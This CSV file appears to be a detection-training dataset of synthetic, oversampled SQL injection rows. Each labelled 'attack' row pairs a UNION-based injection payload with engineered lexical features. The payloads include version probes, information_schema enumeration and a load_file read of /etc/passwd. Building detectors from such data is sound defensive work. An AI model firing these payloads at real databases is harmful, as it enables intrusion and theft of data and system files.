id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000062,1.3120795772622849,89.7423058852932,21.0,3.5315430971670208,14.0,42.696922354117284,16.696922354117284,16.348461177058642,0.1564461351996237,0.4759881228112458,0.18544530029765896,0.1821204416914716,0.32576941147067884,0.6742305885293209,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.674230588529321,1.0,0.0,8.674230588529321,3.0,0.32576941147067895,0.6742305885293209,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000125,0.06773258650380498,65.49834838009872,24.0,4.048867421929451,27.0,20.398678704078975,11.0,7.099669676019745,0.4130845459380059,0.31041831592532637,0.16829370390066908,0.1082034342359987,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.0996696760197446,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,1.6787676404910943,93.8018019345682,28.0,3.9582249373022567,49.13998625232694,4.0,28.07726960280158,12.584546079439685,0.51802219316463,0.04341691082808963,0.30126743967434044,0.13729345633293988,3.0,0.0,2.0,0.0,1.0,1.4154539205603154,0.0,2.0,0.0,0.0,1.0,5.584546079439685,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.4154539205603154,1.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.830907841120631
SMOTE_000035,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,0.04119573984935599,76.0,33.84762945712049,4.46229914044479,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000036,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,0.06518760211474856,75.45642648935909,26.0,4.226639080531888,27.0,28.365141191487275,11.0,9.091285297871819,0.3579460807978841,0.3757676079432485,0.14582988476950834,0.12045642648935909,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,5.091285297871819,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.2682616350841156,104.9183096821628,27.0,4.08512084859905,29.0,46.334647745730244,15.0,14.583661936432561,0.2765593750428146,0.44142646546173003,0.14304795260835237,0.13896620688710298,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.583661936432561,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000038,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.3637846836779785,96.50591037908762,29.332545282788317,4.222916801664908,37.0,30.004728303270095,17.0,12.501182075817523,0.3848342130800575,0.30907635520598076,0.17681571952326966,0.12927371219069214,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.501182075817524,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000039,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.455828840528393,66.58946879264262,23.0,3.8763992438176067,14.0,23.828766712152127,17.042808321961967,11.717893758528524,0.21199581540557658,0.3519379175850085,0.2602943601986237,0.17577190681079125,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.760702080490492,1.0,0.0,3.9571916780380323,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,0.4353134158867548,56.013108899407996,21.3013108899408,3.838800052223686,14.0,18.410487119526405,14.0,9.6026217798816,0.25151736310520756,0.3257101152873229,0.25151736310520756,0.171255158502262,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,2.6026217798816007,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,1.5866639918563992,56.90655660531819,21.781311321063637,3.857406278102037,14.0,17.562622642127273,15.562622642127273,9.781311321063637,0.24777125113074136,0.3079706781514389,0.27257478513276157,0.17168328558505813,0.6093443394681817,0.39065566053181844,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.3906556605318183,1.0,0.0,2.3906556605318188,3.0,0.6093443394681816,0.39065566053181844,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,0.28430571079363354,111.79644651786387,29.0,4.081956208198231,37.0,42.237157214291095,17.0,15.559289303572774,0.3317855288710825,0.3767492712779704,0.15244199975157843,0.1390232000993686,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.559289303572774,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000043,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.38706020054153867,85.82388428882703,26.564776857765406,4.094397266292604,25.0,34.25910743106162,16.0,10.564776857765406,0.29205893156876855,0.3981269101613745,0.18691771620401187,0.1228964420658451,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.564776857765406,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000057,0.35927140676770003,70.74810043901982,22.774810043901983,3.8423400078416274,14.0,27.099240175607928,17.099240175607928,12.549620087803964,0.19863591951592138,0.3829740640414924,0.24109126438726286,0.17729875205532325,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.774810043901982,1.0,0.0,4.774810043901982,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000150,0.3665694427863287,82.98775167824405,27.797550335648808,4.188119561482065,29.0,27.190201342595238,15.0,11.79755033564881,0.35064076252751,0.326030417549021,0.18136591165216034,0.1419629082713087,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.7975503356488094,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000046,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.3050948171311871,85.22588749629622,26.445177499259245,4.093697343905301,25.0,33.78070999703698,16.0,10.445177499259245,0.29399570055610763,0.39546191603479597,0.18815724835590886,0.1223851350531876,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.445177499259244,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,1.5323629801658218,101.3832626836633,26.897210447277217,4.0469599115058905,26.102789552722783,47.58884178910886,13.24302611819304,14.448605223638609,0.25892358261983783,0.4687177135101529,0.12964068458972178,0.14271801928028746,1.0,0.0,3.0,0.0,0.0,0.4486052236386079,0.0,1.0,0.0,0.0,9.0,3.4486052236386078,1.0,0.0,1.0,0.0,0.0,0.4486052236386079,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.44860522363860783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4486052236386078
SMOTE_000048,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.5654732956227799,110.48055255032664,27.30129649664489,3.696425918383846,25.0,48.384442040261305,22.0,15.096110510065326,0.22721619010798558,0.43645409582722305,0.1999502472950273,0.13637946676976404,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.096110510065326,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.41011444679808895,64.26176965591127,21.326176965591127,3.8719954467359754,14.0,34.60941572472901,4.0,11.652353931182253,0.21896449430091025,0.5372426068389078,0.06256128408597436,0.18123161477420768,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,6.652353931182254,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000018,4.5019271836623,54.830750353521545,21.820875075754618,4.093030905498213,34.99012472223308,5.4725005050307765,8.820875075754616,5.547250050503078,0.6548801952941382,0.08419231546201192,0.16024694601366912,0.10068054323018077,0.27362502525153864,0.0,0.2736250252515391,0.0,0.7263749747484612,1.1102230246251565e-16,0.0,1.0,0.0,0.7263749747484612,1.5472500505030777,1.0,0.2736250252515387,0.0,0.0,0.27362502525153876,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4527499494969227
SMOTE_000051,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.10033753905476372,101.10771419168452,26.0,4.031906325840321,62.43085676673812,4.892285808315471,24.89228580831547,8.89228580831547,0.6174372212731614,0.04839665071650551,0.24620733953094054,0.08795878847939254,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.892285808315471,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000052,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000011,6.610375955394068,79.00497843545975,23.24059741225517,3.95486330377267,51.28318619869424,2.16039827483678,18.941095255801145,6.620298706127585,0.6501803196693946,0.021180375243497862,0.24205735928368832,0.08658194580341924,0.0,0.0,1.08019913741839,0.0,1.0,1.540099568709195,0.0,-1.1102230246251565e-16,0.0,0.0,0.540099568709195,4.16039827483678,0.0,0.0,0.540099568709195,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.540099568709195,1.0,1.540099568709195,1.5400995687091952,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.45990043129080505,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.08019913741839
SMOTE_000053,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,0.008234738523347654,60.95032956178962,22.995032956178964,4.027486168336915,27.0,15.9602636494317,11.0,6.990065912357925,0.4430540346614208,0.26177139492982954,0.18050349560280107,0.1146710748059486,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,1.9900659123579252,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,0.015055965570977358,55.097364521633,20.0,3.9374401648180344,14.0,28.077891617306395,4.0,9.019472904326598,0.2541323929385267,0.5095629794988266,0.07260925512529334,0.16369537243735333,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.019472904326599,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000076,0.05069560192673581,56.30350015955342,21.0,4.0150842949809915,14.0,28.242800127642738,4.0,10.060700031910685,0.24875614688707615,0.5014926237355086,0.07107318482487889,0.17867804455253633,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,5.0607000319106845,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.4552331348058865,66.57368311115087,23.0,3.8764185998131055,14.0,23.811928651894267,17.047017837026434,11.714736622230175,0.21204078885712,0.3517862928055192,0.26040615134960304,0.1757667669877577,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.761754459256608,1.0,0.0,3.952982162973567,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000072,0.047249029404572374,66.32982430069441,20.0,3.616464972226425,14.0,36.26385944055553,4.0,12.065964860138882,0.2111358215514892,0.546637014138213,0.060324520443282625,0.1819026438670152,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.06596486013888,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000007,10.864884618376134,66.2347171520284,24.348166058243407,4.158558986588212,27.550611313918864,16.582883210271806,11.0,11.101222627837728,0.43197989591107777,0.2197999336265536,0.17191320711992902,0.17630696334243962,1.5506113139188642,0.0,0.449388686081136,1.1012226278377282,0.0,1.1102230246251565e-16,0.5506113139188641,1.5506113139188642,0.0,0.5506113139188641,4.898777372162272,1.5506113139188638,1.0,0.0,0.0,0.4493886860811359,0.0,0.0,1.0,0.5506113139188641,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5506113139188641,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.550611313918864
SMOTE_000059,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000139,0.42373052550527324,100.1859505453488,28.0,4.086263933942965,29.0,40.948760436279045,15.0,15.237190109069761,0.2901603349207124,0.40778327141751974,0.1500829318555409,0.15197346180622692,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.23719010906976,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000060,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.3608942347070742,117.88678473821312,30.0,4.292801229367426,37.0,46.309427790570496,17.0,17.577356947642624,0.31430879754338187,0.3922480464302073,0.14441215022263493,0.1490310058037759,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.577356947642624,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000061,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.19855574549610128,91.47959037251243,30.197278716334992,4.322643281492098,37.0,25.183672298009952,17.0,12.295918074502488,0.4053180059488931,0.2741820463365711,0.1862271919224644,0.13427275579207137,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.295918074502488,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000062,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,0.06204898133745251,100.0594279721061,26.01980932403537,4.0983306283230245,62.98019067596462,4.019809324035371,23.01980932403537,10.039618648070743,0.6294441849858037,0.040169244710205054,0.23005962029564045,0.10032695000835079,3.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.039618648070743,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.019809324035371167,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000063,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000053,0.006832329602096302,111.9450281223154,27.0,4.031595852836535,29.0,51.95602249785233,15.0,15.989005624463083,0.25906159750107255,0.4641132391020577,0.13399737801779613,0.14282778537907365,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.989005624463083,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
